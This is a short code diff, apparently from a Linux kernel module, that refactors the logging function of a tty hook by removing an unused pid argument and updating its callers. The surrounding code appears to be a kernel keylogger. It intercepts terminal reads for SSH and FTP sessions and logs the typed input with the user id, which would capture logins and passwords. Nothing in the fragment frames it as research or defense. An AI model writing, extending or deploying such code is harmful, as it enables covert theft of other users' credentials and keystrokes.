@@ -775,7 +775,7 @@ _tty_dump(uid_t uid, pid_t pid, char *buf, ssize_t len) {
 }
 
 enum { R_NONE, R_RETURN, R_NEWLINE=2, R_RANGE=4 };
-static void _tty_write_log(uid_t uid, pid_t pid, char *buf, ssize_t len) {
+static void _tty_write_log(uid_t uid, char *buf, ssize_t len) {
     static loff_t offset;
     struct timespec64 ts;
     long msecs;
@@ -842,8 +842,7 @@ static int _key_update(uid_t uid, char byte, int flags) {
             node->buf[node->offset++] = '\n';
             node->buf[node->offset] = 0;
 
-            _tty_write_log(uid, 0, node->buf,
-                    strlen(node->buf));
+            _tty_write_log(uid, node->buf, strlen(node->buf));
 
             list_del(&node->list);
             kfree(node);
@@ -949,9 +948,7 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
          */
         if ((app_flag & APP_FTP) && rv > 1) {
             ttybuf[strcspn(ttybuf, "\r")] = '\0';
-            _tty_write_log(uid, 0, ttybuf,
-                    sizeof(ttybuf));
-
+            _tty_write_log(uid, ttybuf, sizeof(ttybuf));
         } else if (app_flag & APP_SSH &&
                 (rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
             _key_update(uid, byte, flags);
